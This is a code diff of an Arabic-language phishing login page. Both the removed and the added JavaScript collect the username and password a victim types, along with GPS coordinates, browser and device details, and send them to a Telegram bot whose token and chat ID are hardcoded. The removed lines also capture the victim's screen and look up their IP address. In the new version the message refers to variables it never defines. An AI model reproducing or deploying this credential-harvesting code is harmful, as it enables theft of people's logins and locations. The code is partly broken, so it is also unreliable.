@@ -104,134 +104,75 @@
         <form id="login-form">
             <input id="email" name="email" placeholder="اسم المستخدم" required />
             <input id="password" name="password" type="password" placeholder="كلمة المرور" required />
-            <button class="location-btn" type="button" onclick="captureAndSendData()">اضغط هنا لإرسال البيانات والصورة</button>
+            <button class="location-btn" type="button" onclick="getLocation()">إرسال إحداثيات الموقع</button>
+            <button type="submit">تسجيل دخول</button>
         </form>
         <p id="location"></p>
     </div>
 
     <script>
-        // دالة لإلتقاط صورة الشاشة وإرسال البيانات
-        function captureAndSendData() {
-            // الحصول على البيانات المدخلة
-            var user = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-            var userAgent = navigator.userAgent;
-            var platform = navigator.platform;
-            var screenWidth = window.innerWidth;
-            var screenHeight = window.innerHeight;
-
-            // الحصول على الموقع الجغرافي
+        // دالة للحصول على الموقع
+        function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    var lat = position.coords.latitude;
-                    var lon = position.coords.longitude;
-
-                    // التقاط صورة من الشاشة
-                    captureScreen().then(function(screenImage) {
-                        // إرسال البيانات والصورة إلى تليجرام
-                        sendLocationAndDataToTelegram(lat, lon, user, password, userAgent, platform, screenWidth, screenHeight, screenImage);
-                    }).catch(function(error) {
-                        console.error("خطأ في التقاط الشاشة:", error);
-                    });
-                }, function(error) {
-                    document.getElementById("location").innerHTML = "حدث خطأ في الحصول على الموقع.";
-                });
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
             } else {
-                document.getElementById("location").innerHTML = "الرجاء تحديث المتصفح لدعم الحصول على الموقع.";
+                document.getElementById("location").innerHTML = "غير المتصفح للدخول إلى الخادم.";
             }
         }
 
-        // دالة لالتقاط صورة من الشاشة
-        function captureScreen() {
-            return new Promise(function(resolve, reject) {
-                navigator.mediaDevices.getDisplayMedia({ video: true }).then(function(stream) {
-                    var video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            document.getElementById("location").innerHTML = 
+                "إحداثيات الموقع: " + lat + ", " + lon;
 
-                    video.onloadedmetadata = function() {
-                        var canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-
-                        var ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        // إيقاف تدفق الفيديو بعد الالتقاط
-                        stream.getTracks().forEach(function(track) {
-                            track.stop();
-                        });
-
-                        // تحويل الصورة إلى base64
-                        var imageData = canvas.toDataURL('image/png');
-                        resolve(imageData);
-                    };
-                }).catch(function(error) {
-                    reject(error);
-                });
-            });
+            sendLocationToTelegram(lat, lon);
         }
 
-        // دالة لإرسال البيانات والصورة إلى تليجرام
-        function sendLocationAndDataToTelegram(lat, lon, user, password, userAgent, platform, screenWidth, screenHeight, screenImage) {
-            // إرسال IP
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    var ip = data.ip;
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById("location").innerHTML = "تم رفض الوصول إلى الموقع.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById("location").innerHTML = "الموقع غير متاح.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById("location").innerHTML = "استغرق الحصول على الموقع وقتًا طويلاً.";
+                    break;
+                default:
+                    document.getElementById("location").innerHTML = "حدث خطأ غير معروف.";
+            }
+        }
 
-                    // جمع جميع البيانات
-                    var message = `
-                    <b>محاولة تسجيل دخول جديدة</b>\n
+        function sendLocationToTelegram(lat, lon) {
+            // الحصول على البيانات الأخرى
+            var user = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // إرسال الموقع إلى Telegram
+            var botToken = "7912637473:AAHqcroRLNJEMhkVFuTHye3iNQ54VViPv3E";
+            var chatId = "5594532298";
+            var message = `
+                  <b>محاولة تسجيل دخول جديدة</b>\n
                         <b>اسم المستخدم:</b> ${user}\n
                         <b>كلمة المرور:</b> ${password}\n
                         <b>عنوان الـ IP:</b> ${ip}\n
-                        <b>الموقع:</b> ${lat}, ${lon}\n
                         <b>المنصة:</b> ${platform}\n
                         <b>متصفح المستخدم:</b> ${userAgent}\n
                         <b>دقة الشاشة:</b> ${screenWidth}x${screenHeight}
-                    `;
+                <b>إحداثيات الموقع:</b> ${lat}, ${lon}
+            `;
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${encodeURIComponent(message)}`;
 
-                    // إرسال البيانات إلى تليجرام
-                    var botToken = "7912637473:AAHqcroRLNJEMhkVFuTHye3iNQ54VViPv3E";
-                    var chatId = "5594532298";
-
-                    // إرسال البيانات النصية والصورة
-                    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&parse_mode=html&text=${encodeURIComponent(message)}`;
-
-                    var xhr = new XMLHttpRequest();
-                    xhr.open("GET", url, true);
-                    xhr.onreadystatechange = function() {
-                        if (xhr.readyState == 4 && xhr.status == 200) {
-                            console.log("تم إرسال البيانات إلى الخادم.");
-                        }
-                    };
-                    xhr.send();
-
-                    // إرسال الصورة
-                    var formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', dataURLtoBlob(screenImage));
-
-                    var xhrPhoto = new XMLHttpRequest();
-                    xhrPhoto.open("POST", `https://api.telegram.org/bot${botToken}/sendPhoto`, true);
-                    xhrPhoto.send(formData);
-                })
-                .catch(error => {
-                    console.log("حدث خطأ في جلب IP:", error);
-                });
-        }
-
-        // دالة لتحويل صورة base64 إلى Blob
-        function dataURLtoBlob(dataURL) {
-            var byteString = atob(dataURL.split(',')[1]);
-            var mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-            var ab = new ArrayBuffer(byteString.length);
-            var ia = new Uint8Array(ab);
-            for (var i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log("تم إرسال الموقع إلى Telegram.");
+                }
+            };
+            xhr.send();
         }
     </script>
 </body>
